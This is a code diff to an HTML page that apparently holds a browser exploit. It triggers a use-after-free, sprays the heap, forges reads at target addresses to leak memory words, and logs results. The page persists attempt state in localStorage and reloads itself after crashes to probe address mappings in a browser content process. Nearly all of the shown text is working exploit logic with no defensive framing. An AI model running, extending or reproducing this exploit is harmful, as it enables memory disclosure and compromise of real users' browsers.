@@ -122,41 +122,29 @@ if (attempt >= MAX) {
   var hit = false;
   if (!cycle) { bk('FAIL', 'no-uaf'); }
   else {
-    bk('SPRAY', 'n=150|tgt=' + tgtHex + '|cap=' + cap + '|size=' + size + '|arm=' + phase);
-
-    if (phase === 'A') {
-      /* persist the pending-B intent BEFORE the dangerous read: if arm A
-         faults, the next load runs arm B for the SAME T, then advances */
-      try { localStorage.setItem('v911_phase', 'B'); } catch(e) {}
-      var leaked = forge(cycle, tgtHi, tgtLo, 1, 1);
-      /* survived — an anchor. persist the advance FIRST, then beacon. */
-      var lw = hex(leaked);
-      hit = true;
-      try { localStorage.setItem('v911_attempt', String(attempt + 1)); localStorage.setItem('v911_phase', 'A'); localStorage.setItem('v911_hit', tgtHex + '|A|' + lw); } catch(e) {}
-      bk('SURV', 'arm=A|addr=' + tgtHex + '|lw=' + leaked + '|hex=' + lw);
-      say('SURVIVED ' + tgtHex + ' arm=A -> ' + lw);
-      /* bonus attribution: arm B in the same WebProcess — a crash here is harmless now */
-      var c2 = uafCycle();
-      if (!c2) { bk('PAIR', 'A-surv,B-nouaf|addr=' + tgtHex + ' => T mapped (attributed)'); }
-      else {
-        bk('SPRAY-B', 'n=150|tgt=' + tgtHex);
-        var leaked2 = forge(c2, tgtHi, tgtLo, 64, 64);
-        var lw2 = hex(leaked2);
-        bk('PAIR', 'A-surv,B-surv|addr=' + tgtHex + '|lwB=' + leaked2 + '|hexB=' + lw2 + ' => T mapped, big extent');
-        try { localStorage.setItem('v911_hit', tgtHex + '|A+B|' + lw2); } catch(e) {}
-      }
-      bk('DONE', 'T=' + tgtHex + ' attributed-mapped');
-    } else {
-      /* arm B pending after an A crash: persist the advance BEFORE the read */
-      try { localStorage.setItem('v911_phase', 'A'); localStorage.setItem('v911_attempt', String(attempt + 1)); } catch(e) {}
-      var leaked3 = forge(cycle, tgtHi, tgtLo, 64, 64);
-      var lw3 = hex(leaked3);
-      hit = true;
-      bk('SURV', 'arm=B|addr=' + tgtHex + '|lw=' + leaked3 + '|hex=' + lw3 + ' => anomaly: T+0x30 crashed, T+27K mapped');
-      try { localStorage.setItem('v911_hit', tgtHex + '|B|' + lw3); } catch(e) {}
-      bk('DONE', 'T=' + tgtHex + ' arm-B survived (mapping hole)');
+    bk('SPRAY', 'n=150|tgt=' + tgtHex + '|cap=1|size=1');
+    /* single arm per target (pre-registered: crash/crash adds no information;
+       the differential arm B fires only after an A survive, in-process) */
+    try { localStorage.setItem('v911_attempt', String(attempt + 1)); localStorage.setItem('v911_phase', 'A'); } catch(e) {}
+    var leaked = forge(cycle, tgtHi, tgtLo, 1, 1);
+    /* survived — an anchor. */
+    var lw = hex(leaked);
+    hit = true;
+    try { localStorage.setItem('v911_hit', tgtHex + '|A|' + lw); } catch(e) {}
+    bk('SURV', 'arm=A|addr=' + tgtHex + '|lw=' + leaked + '|hex=' + lw);
+    say('SURVIVED ' + tgtHex + ' arm=A -> ' + lw);
+    /* bonus attribution: arm B in the same WebProcess — a crash here is harmless now */
+    var c2 = uafCycle();
+    if (!c2) { bk('PAIR', 'A-surv,B-nouaf|addr=' + tgtHex + ' => T mapped (attributed)'); }
+    else {
+      bk('SPRAY-B', 'n=150|tgt=' + tgtHex);
+      var leaked2 = forge(c2, tgtHi, tgtLo, 64, 64);
+      var lw2 = hex(leaked2);
+      bk('PAIR', 'A-surv,B-surv|addr=' + tgtHex + '|lwB=' + leaked2 + '|hexB=' + lw2 + ' => T mapped, big extent');
+      try { localStorage.setItem('v911_hit', tgtHex + '|A+B|' + lw2); } catch(e) {}
     }
+    bk('DONE', 'T=' + tgtHex + ' attributed-mapped');
   }
-  if (!hit) { setTimeout(function(){ location.reload(); }, 1500); }
+  if (!hit) { setTimeout(function(){ location.reload(); }, 800); }
 }
 </script></body></html>
